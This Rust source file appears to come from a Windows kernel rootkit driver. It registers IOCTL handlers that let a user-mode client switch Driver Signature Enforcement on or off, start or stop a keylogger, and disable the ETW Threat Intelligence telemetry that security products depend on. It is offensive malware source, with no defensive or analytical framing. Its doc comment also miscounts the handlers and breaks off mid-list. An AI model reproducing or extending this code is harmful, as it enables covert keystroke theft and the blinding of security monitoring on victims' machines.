use {
    alloc::boxed::Box, 
    hashbrown::HashMap,
    super::keylogger::set_keylogger_state,
    shared::structs::{Keylogger, DSE, ETWTI},
    wdk_sys::{IO_STACK_LOCATION, IRP, STATUS_SUCCESS},
    shared::ioctls::{IOCTL_ENABLE_DSE, IOCTL_KEYLOGGER, IOCTL_ETWTI}, 
    crate::{handle, misc::{etwti::Etw, dse::Dse}, utils::ioctls::IoctlHandler}, 
};

/// Registers the IOCTL handlers for misc-related operations.
///
/// This function inserts two IOCTL handlers into the provided `HashMap`, associating them with
/// their respective IOCTL codes. The two operations supported are:
///
/// # Parameters
/// 
/// - `ioctls`: A mutable reference to a `HashMap<u32, IoctlHandler>` where the misc-related
///   IOCTL handlers will be inserted.
///
pub fn get_misc_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
    // Responsible for enabling/disabling DSE.
    ioctls.insert(IOCTL_ENABLE_DSE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        let status = unsafe { handle!(stack, Dse::set_dse_state, DSE) };
        unsafe { (*irp).IoStatus.Information = 0 };
        
        match status {
            Ok(_) => STATUS_SUCCESS,
            Err(err_code) => err_code
        }
    }) as IoctlHandler);

    // Start / Stop Keylogger
    ioctls.insert(IOCTL_KEYLOGGER, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        let status = unsafe { handle!(stack, set_keylogger_state, Keylogger) };
        unsafe { (*irp).IoStatus.Information = 0 };

        status
    }) as IoctlHandler);

    // Responsible for enabling/disabling ETWTI.
    ioctls.insert(IOCTL_ETWTI, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        let status = unsafe { handle!(stack, Etw::etwti_enable_disable, ETWTI) };
        unsafe { (*irp).IoStatus.Information = 0 };

        match status {
            Ok(_) => STATUS_SUCCESS,
            Err(err_code) => err_code
        }
    }) as IoctlHandler);
}